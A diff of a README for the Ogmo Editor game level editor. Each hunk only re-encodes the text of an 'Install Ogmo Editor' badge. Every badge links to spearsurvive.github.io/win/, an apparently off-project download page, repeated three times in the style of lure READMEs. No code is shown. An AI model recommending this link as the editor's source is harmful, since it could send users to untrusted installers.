@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Ogmo Editor is a free, open-source game level editor for 2D games. It supports m
 
 <div align="center">
 
-[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Ogmo Editor is a free, open-source game level editor for 2D games. It supports m
 
 <div align="center">
 
-[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ogmo Editor](https://img.shields.io/badge/⬇_Install_Ogmo+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
